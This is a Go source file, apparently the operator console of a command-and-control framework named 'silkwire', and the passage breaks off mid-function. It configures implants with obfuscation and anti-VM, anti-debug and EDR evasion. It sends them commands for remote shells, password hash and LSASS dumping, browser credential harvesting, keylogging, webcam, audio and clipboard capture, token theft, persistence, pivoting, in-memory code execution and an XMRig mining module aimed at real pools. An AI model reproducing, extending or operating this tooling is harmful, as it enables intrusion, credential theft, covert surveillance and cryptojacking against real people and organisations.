package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	pb "silkwire/proto"

	shellquote "github.com/kballard/go-shellquote"
)

// GenerateConfig represents the configuration for generating an implant in Sliver C2 style
type GenerateConfig struct {
	ListenerAddr string
	Transport    string // "mtls", "http", "https", "dns"
	OS           string
	Arch         string
	Format       string
	Debug        bool
	Evasion      bool // Legacy option
	SkipSymbols  bool
	Garble       bool
	Timeout      int32
	OutputDir    string

	// Enhanced Obfuscation Options
	ObfuscationLevel       int  // 0=none, 1=light, 2=medium, 3=heavy, 4=extreme
	StringObfuscation      bool // XOR-based string encryption
	NameObfuscation        bool // Function/variable name obfuscation
	ControlFlowObfuscation bool // Junk code and control flow flattening
	APIObfuscation         bool // Dynamic API resolution
	NetworkObfuscation     bool // Network traffic obfuscation
	RuntimePacking         bool // Runtime code encryption
	UPXPacking             bool // UPX compression
	FakeResources          bool // Fake version info and resources

	// Advanced Evasion Options
	ProcessHollowing      bool // Process hollowing detection
	AntiEmulation         bool // Anti-emulation techniques
	SandboxEvasion        bool // Enhanced sandbox detection
	EDRDetection          bool // EDR/AV process detection
	NetworkFingerprinting bool // Network-based detection evasion

	// Basic Evasion Options
	AntiVM    bool
	AntiDebug bool
	SleepMask bool
}

// generateCommandID generates a unique command ID
func generateCommandID() string {
	return fmt.Sprintf("cmd_%d", time.Now().UnixNano())
}

// SendCommand sends a command via gRPC to the server and waits for the result with enhanced feedback
func (oc *OperatorConsole) SendCommand(implantID string, cmd *pb.CommandMessage) error {
	if oc.client != nil {
		req := &pb.SendCommandRequest{
			ImplantId: implantID,
			Command:   cmd,
		}

		resp, err := oc.client.SendCommand(context.Background(), req)
		if err != nil {
			return fmt.Errorf("failed to send command: %v", err)
		}

		if !resp.Success {
			return fmt.Errorf("command failed: %s", resp.Message)
		}

		// Enhanced progress indication
		fmt.Printf("%s Executing... ", colorize("[*]", colorBlue))

		// Wait for the command result with progress dots
		// Increased timeout to 180 seconds (3 minutes) for slow commands
		resultReq := &pb.CommandResultRequest{
			CommandId:      resp.CommandId,
			TimeoutSeconds: 180,
		}

		// Show progress while waiting (180 seconds / 0.5 seconds per dot = 360 dots)
		done := make(chan bool)
		go func() {
			for i := 0; i < 360; i++ {
				select {
				case <-done:
					return
				default:
					time.Sleep(500 * time.Millisecond)
					fmt.Print(".")
				}
			}
		}()

		resultResp, err := oc.client.GetCommandResult(context.Background(), resultReq)
		done <- true
		fmt.Print(" ")

		if err != nil {
			fmt.Printf("%s Failed to get result: %v\n", colorize("[*]", colorBlue), err)
			return nil
		}

		// If still not ready after timeout, check database one more time
		if !resultResp.Ready {
			fmt.Printf("%s Command still executing, checking database...\n", colorize("[*]", colorBlue))

			// Quick check to see if result arrived in database
			retryReq := &pb.CommandResultRequest{
				CommandId:      resp.CommandId,
				TimeoutSeconds: 5,
			}

			resultResp, err = oc.client.GetCommandResult(context.Background(), retryReq)
			if err != nil {
				fmt.Printf("%s Failed to check result: %v\n", colorize("[*]", colorBlue), err)
				return nil
			}

			if !resultResp.Ready {
				fmt.Printf("%s Command still pending. Command ID: %s\n", colorize("[*]", colorBlue), resp.CommandId)
				return nil
			}
		}

		// Enhanced result display
		displayCommandResult(resultResp)
		return nil
	}

	return fmt.Errorf("no connection to server available")
}

// SendCommandAsync sends a command and returns immediately with the command ID
func (oc *OperatorConsole) SendCommandAsync(implantID string, cmd *pb.CommandMessage) (string, error) {
	if oc.client != nil {
		req := &pb.SendCommandRequest{
			ImplantId: implantID,
			Command:   cmd,
		}

		resp, err := oc.client.SendCommand(context.Background(), req)
		if err != nil {
			return "", fmt.Errorf("failed to send command: %v", err)
		}

		if !resp.Success {
			return "", fmt.Errorf("command failed: %s", resp.Message)
		}

		return resp.CommandId, nil
	}
	return "", fmt.Errorf("no connection to server available")
}

// handleSessionCommand processes and executes session-specific commands
func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
	// Use shellquote.Split to properly handle quoted strings
	// Note: For Windows paths, use forward slashes (C:/Windows/...) or escape backslashes properly
	parts, err := shellquote.Split(input)
	if err != nil {
		// Fallback to simple split if shell parsing fails
		parts = strings.Fields(input)
	}

	// Filter out empty strings and restore Windows path separators
	// shellquote interprets backslashes as escape characters, so we need to handle Windows paths specially
	var filteredParts []string
	for _, part := range parts {
		if part != "" {
			// Check if this looks like a Windows path with forward slashes and contains a drive letter
			// We won't modify it, as Windows accepts forward slashes
			// Users can also use forward slashes: C:/Windows/System32/notepad.exe
			filteredParts = append(filteredParts, part)
		}
	}

	if len(filteredParts) == 0 {
		return
	}

	command := filteredParts[0]
	args := filteredParts[1:]

	var cmdType pb.CommandMessage_CommandType
	var cmdStr string
	var scanOptions *pb.NetworkScanOptions

	// Enhanced command handling with better feedback
	switch command {
	case "shell":
		// If arguments provided, execute as shell command
		if len(args) > 0 {
			fmt.Printf("%s Executing: %s\n", colorize("[*]", colorBlue), strings.Join(args, " "))
			cmdType = pb.CommandMessage_SHELL
			cmdStr = strings.Join(args, " ")
		} else {
			// No arguments - start interactive PTY shell
			fmt.Printf("%s Starting interactive shell...\n", colorize("[*]", colorBlue))
			fmt.Printf("%s Press ~. to exit\n", colorize("[*]", colorBlue))
			oc.startLocalPtyShell(implantID)
			return
		}

	case "ps":
		fmt.Printf("%s Fetching process list...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_PROCESS_LIST
		cmdStr = "ps"

	case "pwd":
		fmt.Printf("%s Getting current directory...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_SHELL
		// Get target implant's OS for proper command selection
		if session, err := oc.FindSessionByPartialID(implantID); err == nil && session.OS == "windows" {
			cmdStr = "cd"
		} else {
			cmdStr = "pwd"
		}

	case "ls":
		if len(args) > 0 {
			fmt.Printf("%s Listing contents of: %s\n", colorize("[*]", colorBlue), strings.Join(args, " "))
		} else {
			fmt.Printf("%s Listing current directory...\n", colorize("[*]", colorBlue))
		}
		cmdType = pb.CommandMessage_SHELL
		// Get target implant's OS for proper command selection
		if session, err := oc.FindSessionByPartialID(implantID); err == nil && session.OS == "windows" {
			if len(args) > 0 {
				cmdStr = "dir " + strings.Join(args, " ")
			} else {
				cmdStr = "dir"
			}
		} else {
			if len(args) > 0 {
				cmdStr = "ls -la " + strings.Join(args, " ")
			} else {
				cmdStr = "ls -la"
			}
		}

	case "cat":
		if len(args) == 0 {
			fmt.Printf("%s Usage: cat <file>\n", colorize("[*]", colorBlue))
			fmt.Println("   Example: cat /etc/passwd")
			return
		}
		fmt.Printf("%s Reading file: %s\n", colorize("[*]", colorBlue), strings.Join(args, " "))
		cmdType = pb.CommandMessage_SHELL
		// Get target implant's OS for proper command selection
		if session, err := oc.FindSessionByPartialID(implantID); err == nil && session.OS == "windows" {
			cmdStr = "type " + strings.Join(args, " ")
		} else {
			cmdStr = "cat " + strings.Join(args, " ")
		}

	case "scan":
		// Parse flags
		fs := flag.NewFlagSet("scan", flag.ContinueOnError)
		target := fs.String("t", "", "Target IP or CIDR (required)")
		ports := fs.String("p", "", "Comma-separated ports (default: top 20)")
		udp := fs.Bool("u", false, "Scan UDP")
		threads := fs.Int("threads", 10, "Number of threads")
		timeout := fs.Int("timeout", 1000, "Timeout in ms")
		banner := fs.Bool("b", false, "Grab banners")

		// Parse args (excluding the command name 'scan')
		if err := fs.Parse(args); err != nil {
			return
		}

		if *target == "" {
			fmt.Printf("%s Usage: scan -t <target> [options]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: scan -t 192.168.1.0/24 -p 80,443,8080 -b\n", colorize("Example", colorYellow))
			fs.PrintDefaults()
			return
		}

		fmt.Printf("%s Scanning target: %s\n", colorize("[*]", colorBlue), *target)
		cmdType = pb.CommandMessage_NETWORK_SCAN
		cmdStr = "scan"

		// Parse ports
		var portList []int32
		if *ports != "" {
			for _, p := range strings.Split(*ports, ",") {
				if pInt, err := strconv.Atoi(strings.TrimSpace(p)); err == nil {
					portList = append(portList, int32(pInt))
				}
			}
		}

		// Create options
		scanOptions = &pb.NetworkScanOptions{
			TargetRange: *target,
			Ports:       portList,
			ScanUdp:     *udp,
			Threads:     int32(*threads),
			TimeoutMs:   int32(*timeout),
			BannerGrab:  *banner,
		}

		// Async execution for scan
		cmd := &pb.CommandMessage{
			CommandId:          generateCommandID(),
			Type:               cmdType,
			Command:            cmdStr,
			Args:               nil, // Args handled via options
			Timeout:            int32(*timeout),
			NetworkScanOptions: scanOptions,
		}

		cmdID, err := oc.SendCommandAsync(implantID, cmd)
		if err != nil {
			fmt.Printf("%s Failed to start scan: %v\n", colorize("[!]", colorRed), err)
		} else {
			fmt.Printf("%s Scan started in background. Command ID: %s\n", colorize("[+]", colorGreen), cmdID)
			fmt.Printf("%s Use 'jobs' to see status and 'results %s' to view output when complete.\n", colorize("[*]", colorBlue), cmdID)
		}
		return

	case "ping":
		if len(args) == 0 {
			fmt.Printf("%s Usage: ping <target>\n", colorize("[*]", colorBlue))
			return
		}
		fmt.Printf("%s Pinging: %s\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_NETWORK_SCAN
		cmdStr = "ping"
		// Ping is just a simple scan
		scanOptions = &pb.NetworkScanOptions{
			TargetRange: args[0],
			Ports:       nil, // Default ports (will be handled by implant)
			ScanUdp:     false,
			Threads:     1,
			TimeoutMs:   2000,
			BannerGrab:  false,
		}
		// We'll use this below

	case "sleep":
		if len(args) == 0 {
			fmt.Printf("%s Usage: sleep <seconds>\n", colorize("[*]", colorBlue))
			fmt.Println("   Example: sleep 60")
			return
		}
		fmt.Printf("%s Setting beacon interval to %s seconds\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_SLEEP
		cmdStr = "sleep"

	case "sysinfo":
		fmt.Printf("%s Gathering system information...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_SHELL
		// Get target implant's OS for proper command selection
		if session, err := oc.FindSessionByPartialID(implantID); err == nil && session.OS == "windows" {
			cmdStr = "systeminfo"
		} else {
			cmdStr = "uname -a && whoami && id"
		}

	case "info":
		fmt.Printf("%s Collecting session information...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_INFO
		cmdStr = "info"

	case "hashdump":
		fmt.Printf("%s Dumping password hashes...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_HASHDUMP
		cmdStr = "hashdump"

	case "ifconfig":
		fmt.Printf("%s Getting network interfaces...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_IFCONFIG
		cmdStr = "ifconfig"

	case "module-list":
		fmt.Printf("%s Listing available modules...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_MODULE_LIST
		cmdStr = "module-list"

	case "module-load":
		if len(args) == 0 {
			fmt.Printf("%s Usage: module load <module_name> [key=value ...]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: module load xmrig\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Downloads XMRig v6.24.0 for your platform and prepares for execution\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Loading module: %s\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_MODULE_LOAD
		cmdStr = args[0]

	case "module-start":
		if len(args) == 0 {
			fmt.Printf("%s Usage: module start <module_name> [key=value ...]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: module start xmrig pool=pool.supportxmr.com:443 wallet=YOUR_WALLET\n", colorize("Basic", colorYellow))
			fmt.Printf("   %s: module start xmrig pool=gulf.moneroocean.stream:10128 wallet=YOUR_WALLET tls=true threads=8\n", colorize("Advanced", colorYellow))
			fmt.Printf("   %s: pool (required), wallet (required), worker, tls, threads, coin, algo\n", colorize("Parameters", colorCyan))
			return
		}
		fmt.Printf("%s Starting module: %s\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_MODULE_START
		cmdStr = args[0]

	case "module-stop":
		if len(args) == 0 {
			fmt.Printf("%s Usage: module stop <module_name>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: module stop xmrig\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Gracefully stops mining and releases system resources\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Stopping module: %s\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_MODULE_STOP
		cmdStr = args[0]

	case "module-status":
		if len(args) == 0 {
			fmt.Printf("%s Usage: module status <module_name>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: module status xmrig\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Shows running state, PID, config, hashrate, and performance metrics\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Getting module status: %s\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_MODULE_STATUS
		cmdStr = args[0]

	case "module-config":
		if len(args) < 2 {
			fmt.Printf("%s Usage: module config <module_name> <json_config>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: module config xmrig '{\"pool\":\"pool.supportxmr.com:443\",\"wallet\":\"YOUR_WALLET\"}'\n", colorize("Basic", colorYellow))
			fmt.Printf("   %s: module config xmrig '{\"pool\":\"gulf.moneroocean.stream:10128\",\"wallet\":\"YOUR_WALLET\",\"tls\":true,\"threads\":8}'\n", colorize("Advanced", colorYellow))
			fmt.Printf("   %s: Hot-reload configuration with zero downtime restart\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Configuring module: %s\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_MODULE_CONFIG
		cmdStr = args[0]

	case "upload":
		if len(args) != 2 {
			fmt.Printf("%s Usage: upload <local_file> <remote_path>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: upload /local/file.txt /remote/path/file.txt\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Upload a local file to the target system\n", colorize("Details", colorCyan))
			return
		}

		// Handle upload with file content reading
		oc.handleUploadCommand(implantID, args[0], args[1])
		return

	case "download":
		if len(args) != 2 {
			fmt.Printf("%s Usage: download <remote_file> <local_path>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: download /remote/file.txt /local/path/file.txt\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Download a file from the target system\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Downloading %s to %s...\n", colorize("[*]", colorBlue), args[0], args[1])

		// Handle download with special processing
		oc.handleDownloadCommand(implantID, args[0], args[1])
		return

	// SOCKS Proxy & Port Forwarding
	case "socks":
		if len(args) == 0 {
			fmt.Printf("%s Usage: socks <start|stop> [port]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: socks start 1080\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Start a SOCKS5 proxy on port 1080\n", colorize("Details", colorCyan))
			return
		}
		if args[0] == "start" {
			port := "1080"
			if len(args) > 1 {
				port = args[1]
			}
			fmt.Printf("%s Starting SOCKS5 proxy on port %s...\n", colorize("[*]", colorBlue), port)
			cmdType = pb.CommandMessage_SOCKS_START
			cmdStr = "socks"
		} else if args[0] == "stop" {
			fmt.Printf("%s Stopping SOCKS5 proxy...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_SOCKS_STOP
			cmdStr = "socks"
		}

	case "portfwd":
		if len(args) == 0 {
			fmt.Printf("%s Usage: portfwd <add|remove|list> [options]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: portfwd add 8080 192.168.1.10 80\n", colorize("Add", colorYellow))
			fmt.Printf("   %s: portfwd remove 8080\n", colorize("Remove", colorYellow))
			fmt.Printf("   %s: portfwd list\n", colorize("List", colorYellow))
			return
		}
		if args[0] == "add" {
			if len(args) < 4 {
				fmt.Printf("%s Usage: portfwd add <bind_port> <forward_host> <forward_port>\n", colorize("[!]", colorRed))
				return
			}
			fmt.Printf("%s Adding port forward: %s -> %s:%s\n", colorize("[*]", colorBlue), args[1], args[2], args[3])
			cmdType = pb.CommandMessage_PORTFWD_ADD
			cmdStr = "portfwd"
			args = args[1:] // Remove 'add' from args
		} else if args[0] == "remove" {
			if len(args) < 2 {
				fmt.Printf("%s Usage: portfwd remove <bind_port>\n", colorize("[!]", colorRed))
				return
			}
			fmt.Printf("%s Removing port forward on port %s\n", colorize("[*]", colorBlue), args[1])
			cmdType = pb.CommandMessage_PORTFWD_REMOVE
			cmdStr = "portfwd"
			args = args[1:]
		} else if args[0] == "list" {
			fmt.Printf("%s Listing port forwards...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_PORTFWD_LIST
			cmdStr = "portfwd"
			args = []string{}
		}

	// .NET Assembly Execution
	case "execute-assembly", "exec-asm":
		if len(args) == 0 {
			fmt.Printf("%s Usage: execute-assembly [options] <path_to_assembly> [args...]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: execute-assembly ./Seatbelt.exe -group=system\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Execute .NET assemblies in memory via sacrificial process (default)\n", colorize("Details", colorCyan))
			fmt.Printf("   %s: Use -i/--in-process for stealthier but riskier in-process execution\n", colorize("Note", colorYellow))
			return
		}
		oc.handleExecuteAssembly(implantID, args)
		return
	case "execute-shellcode":
		oc.handleExecuteShellcode(implantID, args)
		return
	case "execute-pe":
		oc.handleExecutePE(implantID, args)
		return
	case "execute-bof", "bof":
		oc.handleExecuteBOF(implantID, args)
		return

	// Persistence Mechanisms
	case "persist":
		if len(args) == 0 {
			fmt.Printf("%s Usage: persist <install|remove|list> [method]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: persist install registry\n", colorize("Install", colorYellow))
			fmt.Printf("   %s: persist remove task\n", colorize("Remove", colorYellow))
			fmt.Printf("   %s: persist list\n", colorize("List", colorYellow))
			fmt.Printf("   %s: registry, task, service, startup (Windows) | cron, systemd, bashrc (Linux)\n", colorize("Methods", colorCyan))
			return
		}
		if args[0] == "install" {
			method := "registry"
			if len(args) > 1 {
				method = args[1]
			}
			fmt.Printf("%s Installing persistence using method: %s\n", colorize("[*]", colorBlue), method)
			cmdType = pb.CommandMessage_PERSIST_INSTALL
			cmdStr = "persist"
			args = []string{method}
		} else if args[0] == "remove" {
			method := "registry"
			if len(args) > 1 {
				method = args[1]
			}
			fmt.Printf("%s Removing persistence method: %s\n", colorize("[*]", colorBlue), method)
			cmdType = pb.CommandMessage_PERSIST_REMOVE
			cmdStr = "persist"
			args = []string{method}
		} else if args[0] == "list" {
			fmt.Printf("%s Listing persistence mechanisms...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_PERSIST_LIST
			cmdStr = "persist"
			args = []string{}
		}

	// Credential Harvesting
	case "lsass":
		fmt.Printf("%s Dumping LSASS process memory (requires SYSTEM/Admin)...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_DUMP_LSASS
		cmdStr = "lsass"

	case "harvest":
		if len(args) == 0 {
			fmt.Printf("%s Usage: harvest <chrome|firefox|edge|all>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: harvest all\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Harvest saved credentials from browsers\n", colorize("Details", colorCyan))
			return
		}
		switch args[0] {
		case "chrome":
			fmt.Printf("%s Harvesting Chrome credentials...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_HARVEST_CHROME
		case "firefox":
			fmt.Printf("%s Harvesting Firefox credentials...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_HARVEST_FIREFOX
		case "edge":
			fmt.Printf("%s Harvesting Edge credentials...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_HARVEST_EDGE
		case "all":
			fmt.Printf("%s Harvesting all browser credentials...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_HARVEST_ALL_BROWSERS
		default:
			fmt.Printf("%s Unknown browser: %s\n", colorize("[!]", colorRed), args[0])
			return
		}
		cmdStr = "harvest"

	// Process Migration
	case "migrate":
		if len(args) < 1 {
			fmt.Printf("%s Usage: migrate <pid>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: migrate 1234\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Migrate implant to another process\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Migrating to PID %s...\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_MIGRATE
		cmdStr = "migrate"

	// Surveillance Features
	case "clipboard":
		duration := "30"
		if len(args) > 0 {
			duration = args[0]
		}
		fmt.Printf("%s Monitoring clipboard for %s seconds...\n", colorize("[*]", colorBlue), duration)
		cmdType = pb.CommandMessage_CLIPBOARD_MONITOR
		cmdStr = "clipboard"
		args = []string{duration}

	case "keylog":
		if len(args) == 0 {
			fmt.Printf("%s Usage: keylog <start|stop>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: keylog start\n", colorize("Start", colorYellow))
			fmt.Printf("   %s: keylog stop\n", colorize("Stop", colorYellow))
			fmt.Printf("   %s: Enhanced keylogger with window title tracking\n", colorize("Details", colorCyan))
			return
		}
		if args[0] == "start" {
			fmt.Printf("%s Starting keylogger with window tracking...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_KEYLOG_START
			cmdStr = "keylog"
			args = []string{}
		} else if args[0] == "stop" {
			fmt.Printf("%s Stopping keylogger and retrieving logs...\n", colorize("[*]", colorBlue))
			cmdType = pb.CommandMessage_KEYLOG_STOP
			cmdStr = "keylog"
			args = []string{}
		} else {
			fmt.Printf("%s Unknown keylog action: %s\n", colorize("[!]", colorRed), args[0])
			return
		}

	case "screenshot":
		// Use special handler that automatically downloads the file
		oc.handleScreenshotCommand(implantID)
		return

	case "audio":
		duration := "5"
		if len(args) > 0 {
			duration = args[0]
		}
		fmt.Printf("%s Recording audio for %s seconds...\n", colorize("[*]", colorBlue), duration)
		cmdType = pb.CommandMessage_AUDIO_CAPTURE
		cmdStr = "audio"
		args = []string{duration}

	case "webcam":
		if len(args) == 0 {
			fmt.Printf("%s Usage: webcam <photo|video> [duration]\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: webcam photo\n", colorize("Photo", colorYellow))
			fmt.Printf("   %s: webcam video 10\n", colorize("Video", colorYellow))
			fmt.Printf("   %s: Capture from webcam (requires ffmpeg)\n", colorize("Details", colorCyan))
			return
		}
		format := args[0]
		duration := "0"
		if format == "video" && len(args) > 1 {
			duration = args[1]
		}
		if format == "photo" {
			fmt.Printf("%s Capturing webcam photo...\n", colorize("[*]", colorBlue))
		} else if format == "video" {
			fmt.Printf("%s Recording webcam video for %s seconds...\n", colorize("[*]", colorBlue), duration)
		} else {
			fmt.Printf("%s Invalid format: %s (use 'photo' or 'video')\n", colorize("[!]", colorRed), format)
			return
		}
		cmdType = pb.CommandMessage_WEBCAM_CAPTURE
		cmdStr = "webcam"
		args = []string{duration, format}

	// Token Manipulation (Windows)
	case "token-list":
		fmt.Printf("%s Enumerating available tokens from running processes...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_TOKEN_LIST
		cmdStr = "token-list"
		args = []string{}

	case "token-steal", "steal-token":
		if len(args) == 0 {
			fmt.Printf("%s Usage: token-steal <pid>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: token-steal 1234\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Steal access token from a running process\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Stealing token from PID %s...\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_TOKEN_STEAL
		cmdStr = "token-steal"

	case "token-impersonate", "impersonate-token":
		if len(args) == 0 {
			fmt.Printf("%s Usage: token-impersonate <token_id>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: token-impersonate token_1234_0\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Impersonate a previously stolen token\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Impersonating token %s...\n", colorize("[*]", colorBlue), args[0])
		cmdType = pb.CommandMessage_TOKEN_IMPERSONATE
		cmdStr = "token-impersonate"

	case "token-revert", "revert-token":
		fmt.Printf("%s Reverting to original token...\n", colorize("[*]", colorBlue))
		cmdType = pb.CommandMessage_TOKEN_REVERT
		cmdStr = "token-revert"
		args = []string{}

	case "token-make", "make-token":
		if len(args) < 3 {
			fmt.Printf("%s Usage: token-make <domain> <username> <password>\n", colorize("[*]", colorBlue))
			fmt.Printf("   %s: token-make CORP administrator P@ssw0rd\n", colorize("Example", colorYellow))
			fmt.Printf("   %s: Create and impersonate a token with network credentials\n", colorize("Details", colorCyan))
			return
		}
		fmt.Printf("%s Creating token for %s\\%s...\n", colorize("[*]", colorBlue), args[0], args[1])
		cmdType = pb.CommandMessage_TOKEN_MAKE_TOKEN
		cmdStr = "token-make"

	case "jobs":
		fmt.Printf("%s Fetching recent commands...\n", colorize("[*]", colorBlue))
		if oc.client != nil {
			req := &pb.CommandListRequest{
				ImplantId: implantID,
				Limit:     20,
			}
			resp, err := oc.client.ListCommands(context.Background(), req)
			if err != nil {
				fmt.Printf("%s Failed to list commands: %v\n", colorize("[!]", colorRed), err)
			} else {
				printJobsTable(resp.Commands)
			}
		}
		return

	case "results":
		if len(args) == 0 {
			fmt.Printf("%s Usage: results <command_id>\n", colorize("[*]", colorBlue))
			return
		}
		cmdID := args[0]
		if oc.client != nil {
			req := &pb.CommandResultRequest{
				CommandId:      cmdID,
				TimeoutSeconds: 5,
			}
			resp, err := oc.client.GetCommandResult(context.Background(), req)
			if err != nil {
				fmt.Printf("%s Failed to get result: %v\n", colorize("[!]", colorRed), err)
			} else {
				displayCommandResult(resp)
			}
		}
		return

	default:
		cmdType = pb.CommandMessage_SHELL
		cmdStr = input
	}

	// Create command message
	var cmdArgs []string
	var cmdData []byte

	if cmdType == pb.CommandMessage_SHELL && command == "shell" {
		// For shell commands, don't pass the original args since cmdStr already contains the full command
		cmdArgs = []string{}
	} else if cmdType == pb.CommandMessage_MODULE_CONFIG {
		// For module-config, the first arg is the module name (already in cmdStr),
		// and the second arg is the JSON config (goes in Data field)
		cmdArgs = []string{} // Module name is in Command field
		if len(args) > 1 {
			cmdData = []byte(strings.Join(args[1:], " "))
		}
	} else {
		cmdArgs = args
	}

	cmd := &pb.CommandMessage{
		CommandId:          generateCommandID(),
		Type:               cmdType,
		Command:            cmdStr,
		Args:               cmdArgs,
		Data:               cmdData,
		Timeout:            15,          // Reduced timeout for better UX
		NetworkScanOptions: scanOptions, // This variable needs to be defined in the scope
	}

	// Update last activity
	oc.lastActivity = time.Now()

	// Send command via gRPC to server
	err = oc.SendCommand(implantID, cmd)
	if err != nil {
		fmt.Printf("%s Failed to send command: %v\n", colorize("[*]", colorBlue), err)
		return
	}
}

// KillSession sends a kill command to terminate a session
func (oc *OperatorConsole) KillSession(implantID string) {
	cmd := &pb.CommandMessage{
		CommandId: generateCommandID(),
		Type:      pb.CommandMessage_KILL,
		Command:   "kill",
		Timeout:   5,
	}

	err := oc.SendCommand(implantID, cmd)
	if err != nil {
		fmt.Printf("Failed to send kill command: %v\n", err)
		return
	}
}

// handleDownloadCommand handles download commands with special result processing
func (oc *OperatorConsole) handleDownloadCommand(implantID, remoteFile, localPath string) {
	cmd := &pb.CommandMessage{
		CommandId: generateCommandID(),
		Type:      pb.CommandMessage_DOWNLOAD,
		Command:   "download",
		Args:      []string{remoteFile, localPath},
		Timeout:   30,
	}

	if oc.client != nil {
		req := &pb.SendCommandRequest{
			ImplantId: implantID,
			Command:   cmd,
		}

		resp, err := oc.client.SendCommand(context.Background(), req)
		if err != nil {
			fmt.Printf("%s Failed to send download command: %v\n", colorize("[*]", colorBlue), err)
			return
		}

		if !resp.Success {
			fmt.Printf("%s Download command failed: %s\n", colorize("[*]", colorBlue), resp.Message)
			return
		}

		// Wait for the command result
		resultReq := &pb.CommandResultRequest{
			CommandId:      resp.CommandId,
			TimeoutSeconds: 30,
		}

		fmt.Printf("%s Waiting for download result... ", colorize("[*]", colorBlue))
		resultResp, err := oc.client.GetCommandResult(context.Background(), resultReq)
		if err != nil {
			fmt.Printf("Failed to get download result: %v\n", err)
			return
		}

		if !resultResp.Success {
			fmt.Printf("Download failed: %s\n", resultResp.Error)
			return
		}

		// Process download result
		if strings.HasPrefix(resultResp.Output, "DOWNLOAD_SUCCESS|") {
			oc.processDownloadResult(resultResp.Output, localPath)
		} else {
			fmt.Printf("Download completed: %s\n", resultResp.Output)
		}
	} else {
		fmt.Printf("%s No server connection available\n", colorize("[*]", colorBlue))
	}
}

// processDownloadResult processes the download result and saves the file
func (oc *OperatorConsole) processDownloadResult(result, localPath string) {
	// Parse the result: DOWNLOAD_SUCCESS|localPath|size|base64Content
	parts := strings.SplitN(result, "|", 4)
	if len(parts) != 4 {
		fmt.Printf("Invalid download result format\n")
		return
	}

	sizeStr := parts[2]
	encodedContent := parts[3]

	// Decode the base64 content
	content, err := base64.StdEncoding.DecodeString(encodedContent)
	if err != nil {
		fmt.Printf("Failed to decode file content: %v\n", err)
		return
	}

	// Ensure directory exists
	dir := filepath.Dir(localPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		fmt.Printf("Failed to create directory %s: %v\n", dir, err)
		return
	}

	// Write the file
	if err := ioutil.WriteFile(localPath, content, 0644); err != nil {
		fmt.Printf("Failed to write file %s: %v\n", localPath, err)
		return
	}

	fmt.Printf("%s Successfully downloaded file to %s (%s bytes)\n",
		colorize("[+]", colorCyan), localPath, sizeStr)
}

// formatSize formats bytes into human-readable format
func formatSize(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
